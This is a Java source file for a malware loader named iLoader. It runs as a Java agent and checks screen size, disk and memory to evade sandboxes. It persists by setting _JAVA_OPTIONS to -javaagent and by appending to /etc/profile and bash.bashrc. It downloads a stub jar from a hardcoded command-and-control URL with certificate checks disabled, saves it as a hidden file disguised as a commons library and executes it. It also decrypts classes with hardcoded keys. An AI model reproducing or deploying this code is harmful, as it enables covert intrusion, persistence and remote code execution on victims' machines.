package com.nocebo.nLoader;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.StringWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.StringReader;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
import java.lang.invoke.MethodHandles;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.util.Base64;
import java.util.Arrays;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;

import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.NoSuchFileException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.security.InvalidAlgorithmParameterException;
import java.security.KeyManagementException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import javax.crypto.IllegalBlockSizeException;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URI;
import java.net.URISyntaxException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.security.spec.AlgorithmParameterSpec;
import java.text.SimpleDateFormat;
import java.security.InvalidKeyException;
import java.util.List;
import java.awt.HeadlessException;
import java.awt.Toolkit;


public class iLoader
{
    static public String urlData = "https://192.168.1.157/";
    static public String apiKey = "a18b25f2-6045-4aa2-b0b5-1dae01aa4f9a";
    static public String agentKey = "q8uf6,p2m1@31395aO+g+9592_4891lS";
    static public String envVar = "_JAVA_OPTIONS";
    static public String jarPath = "";
    static public String stubPath = "";
    static public boolean isAgent = true;
    static public String currentClass = "";
    static public int virtThreshold = 5; //5 for when it's ready



    //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nLoader\*.java
    //cd src\main\java
    //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cfm ..\..\..\..\server\fileroot\lib\iLoader.jar ..\..\..\MANIFEST.txt .\com\nocebo\nLoader\*.class
    public static void main(String[] args) throws Exception, IOException, UnmodifiableClassException, KeyManagementException, NoSuchAlgorithmException, InterruptedException, ClassNotFoundException, URISyntaxException, SocketException
    {
        Class currentClass = MethodHandles.lookup().lookupClass();
        passThroughJar(getObfuscatedName(currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()),args);
        isAgent = false;
        TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
        //sleep 30-45 (seconds for testing, minutes for release)
        //for attach execution
        coreOp();
    }

    public static void premain(String agentArgs, Instrumentation inst) throws Exception, InstantiationException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
    {
        System.out.println("iLoader");
        //TimeUnit.MILLISECONDS.sleep((rngenerator(2,5))*1000);
        //sleep 30-45 (seconds for testing, minutes for release)
        //for attach execution
        coreOp();
        System.out.println("finished core op");

        /* 
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URLClassLoader cLoader = downloadRequest(String.format("%s%s",urlData,"59013"));

                Class initClass = cLoader.loadClass("com.nocebo.nCore.iAgent");
                    Object initClassObj = initClass.newInstance();
                    initClass.getMethod("init").invoke(initClassObj);
                } catch (NoSuchAlgorithmException | ClassNotFoundException |NoSuchMethodException | InstantiationException | IOException | URISyntaxException | InvocationTargetException | IllegalAccessException | KeyManagementException e) {
                    // exception handling
                }
            }
        });
        
        thread.start();
        */
        String stubName = ".commons-3.3.1";

        String workingDir = System.getProperty("user.dir");
        String stubPath = String.format("%s%s%s.jar",new File(workingDir).getAbsolutePath(),File.separator,stubName);  
        byte[] jarBytes = downloadRequest(String.format("%s%s",urlData,"59013"));
        Files.write(Paths.get(stubPath), jarBytes);
        if (System.getProperty("os.name").toLowerCase().contains("win"))
        {
            Files.setAttribute(Paths.get(stubPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
        } 
        System.out.println(System.getProperty("sun.java.command"));
        if (!System.getProperty("sun.java.command").contains("commons-3.3.1"))
        {
            passThroughJar(stubPath, (new String[]{}));
        }
    }


    public static void coreOp() throws Exception, IOException, UnmodifiableClassException, KeyManagementException, SocketException, ClassNotFoundException, URISyntaxException, NoSuchAlgorithmException
    {
        if (!chkSandbox())
        {
            Class currentClass = MethodHandles.lookup().lookupClass();
            jarPath = new File(currentClass.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getAbsolutePath();

            //chk for persistence and add if not present
            if (!chkPersistence() && isAgent)
            {
                mkPersistence();
            }
            else if (!chkPersistence() && !isAgent)
            {
                mkPersistence();
                passThroughJar(stubPath, new String[]{});
                try 
                {
                    Files.delete(Paths.get(stubPath));
                } 
                catch (Exception x) 
                {}
                System.exit(0);                
            }

        }
        else
        {
            //spoliate here
            System.exit(0);
        }
    }

    public static void passThroughJar(String pathToJar, String[] initArgs)
    {
        //process args, runtime exec
        //need to feed it the obfuscated name
        
        if (new File(pathToJar).isFile())
        {
            String[] cmdArgs = new String[] {"javaw.exe","-jar",pathToJar};
            String[] cmdArrayData = Stream.concat(Arrays.stream(cmdArgs),Arrays.stream(initArgs)).toArray(String[]::new);

            try
            {
                Runtime.getRuntime().exec(cmdArrayData);
            }
            catch (Exception r)
            {
                //idgaf, probably
            }
        }
    }

    public static String getObfuscatedName(String pathToJar)
    {
        String[] nameValRaw = pathToJar.split("/");
        String nameVal = nameValRaw[nameValRaw.length-1];
        String bakName = "";
        bakName = String.format(".bak-%s",nameVal);
        return bakName;
    }

    public static boolean chkPersistence()
    {
        String envVarVal = null;
        try
        {
            envVarVal = System.getenv(envVar);
        }
        catch (Exception e)
        {
            return false;
        }  
        if (envVarVal == null)
        {
            return false;
        }
        else if (envVarVal.contains("-javaagent") && envVarVal.contains(jarPath))
        {
            return true;
        }
        return true;
    }

    public static void mkPersistence()
    {
        if (System.getProperty("os.name").toLowerCase().contains("win"))
        {
            try
            {
                //lazy but idgaf, this is the simplest way to do it. I may switch to registry if I have time
                Runtime.getRuntime().exec(new String[]{"setx",envVar,String.format("-javaagent:%s",jarPath)});
                Runtime.getRuntime().exec(new String[]{"setx",envVar,String.format("-javaagent:%s",jarPath),"/m"});
            }
            catch (Exception e)
            {
                if (!isAgent && !chkPersistence())
                {
                    //should probably have a cleanup too
                    System.exit(1);
                }
            }
        }
        else
        {
            if (new File("/etc/profile").isFile())
            {
                try (BufferedWriter writer = new BufferedWriter(new FileWriter("/etc/profile", true))) 
                {
                    writer.write(String.format("export %s=%s",envVar,jarPath));
                    writer.newLine(); // Add a new line if desired
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }     

            if (new File("/etc/bash.bashrc").isFile())
            {
                try (BufferedWriter writer = new BufferedWriter(new FileWriter("/etc/bash.bashrc", true))) 
                {
                    writer.write(String.format("export %s=%s",envVar,jarPath));
                    writer.newLine(); // Add a new line if desired
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }     
        }
    }
    
    

    private static byte[] downloadRequest(String finalUrl) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
    {
        //stackoverflow provided boilerplate
        SSLContext sslCon = SSLContext.getInstance("TLS");
        sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);

        URL ctrlUrl = new URI(finalUrl).toURL();

        HttpsURLConnection connMan;
        try
        {
            HttpsURLConnection.setDefaultSSLSocketFactory(sslCon.getSocketFactory());

            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

            connMan = (HttpsURLConnection) ctrlUrl.openConnection();

            connMan.setRequestMethod("GET");
            connMan.setDoOutput(true);
            connMan.setRequestProperty(
                "Cookie",
                String.format(
                    "__Secure-YEC=%s",
                    new String(Base64.getUrlEncoder().encode(apiKey.getBytes())),
                    apiKey
                )
            );



            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

    try {
        byte[] chunk = new byte[4096];
        int bytesRead;
        InputStream stream = connMan.getInputStream();

        while ((bytesRead = stream.read(chunk)) !=-1) {
            outputStream.write(chunk, 0, bytesRead);
        }

    } catch (IOException e) {
        e.printStackTrace();
        return null;
    }

    return outputStream.toByteArray();
            
        }
        catch (Exception e)
        {
            return null;
        }
    }

    public static Hashtable<String,byte[]> decodeClasses(String responseData, String nonceData) throws Exception, NoSuchAlgorithmException, KeyManagementException, IOException
    {
        Hashtable<String,byte[]> decodedResponseData = new Hashtable();
        String[] rDataSet = responseData.split("\\|");
                    
        for (int r=0;r<rDataSet.length;r++)
        {                

            String[] rData = rDataSet[r].split("\\.");
            String cNameData = new String(
                Base64.getDecoder().decode(
                    rData[0].getBytes()
                )
            );
            

            decodedResponseData.put(
                cNameData,
                decrypt(
                        Base64.getDecoder().decode(
                            rData[1].getBytes()
                        ),
                        agentKey.getBytes(),
                        nonceData.getBytes()
                    )        
                );     
        } 
        return decodedResponseData;                
                    
    }

    public static Hashtable<String,byte[]> decodeJar(String responseData, String nonceData) throws Exception, NoSuchAlgorithmException, KeyManagementException, IOException
    {
        Hashtable<String,byte[]> decodedResponseData = new Hashtable();

        decodedResponseData.put(
                "stub",
                decrypt(
                        Base64.getDecoder().decode(
                            responseData.getBytes()
                        ),
                        agentKey.getBytes(),
                        nonceData.getBytes()
                    )        
                );

        return decodedResponseData;   
    }

    //stackoverflow: https://stackoverflow.com/questions/26393031/how-to-execute-a-https-get-request-from-java
    public static class InvalidCertificateTrustManager implements X509TrustManager
    {
        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return null;
        }

        @Override
        public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {

        }

        @Override
        public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
        }    
    }

    private static boolean chkSandbox() throws SocketException
    {
        //this should go in the loader too 
        //score the system
        int score = 0;

        //get resolution
        Toolkit awtToolkit = Toolkit.getDefaultToolkit();
        try
        {
            int scWidth = (int) awtToolkit.getScreenSize().getWidth();
            int scHeight = (int) awtToolkit.getScreenSize().getHeight();
            if (scWidth < 1300 && scHeight < 850)
            {
                score += 1;
            }
        }
        catch (HeadlessException h)
        {
            score += 1;
        }

        //<40gb (+5), <60gb (+3), <80gb (+1)
        long diskSpace = new File("/").getTotalSpace();

        if (diskSpace > 60000000000L && diskSpace < 80000000000L)
        {
            score += 1;
        }
        else if (diskSpace > 40000000000L && diskSpace < 60000000000L)
        {
            score += 2;
        }
        else if (diskSpace < 40000000000L)
        {
            score += 3;
        }

        //<2gb (+3), <4gb (+2) <6gb (+1)
        long memorySize = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
        
        if (memorySize > 4000000000L && memorySize < 6000000000L)
        {
            score += 1;
        }
        else if (memorySize > 2000000000L && memorySize < 4000000000L) 
        {
            score += 2;
        }
        else if (memorySize < 2000000000L) 
        {
            score += 3;
        }

        if (score <= virtThreshold)
        {
            return false;
        }
        else
        {
            return true;
        }
    }    
    
    public static int rngenerator(int min, int max) throws NoSuchAlgorithmException 
    {
        SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
        int randNum = rHandle.ints(1,min,max).findFirst().getAsInt();
        return randNum;
    }

    public static byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        SecretKey key = initKey(keyData);
        Cipher cipher = initCipher();

        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
        cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
        return cipher.doFinal(plaintext);
    }

    public static byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
    {
        SecretKey key = initKey(keyData);
        Cipher cipher = initCipher();

        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
        cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
        return cipher.doFinal(encrypted);
    }

    private static Cipher initCipher() throws Exception
    {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        return cipher;
    }

    private static SecretKey initKey(byte[] keyBytes) throws Exception
    {
        SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
        return key;
    }    
}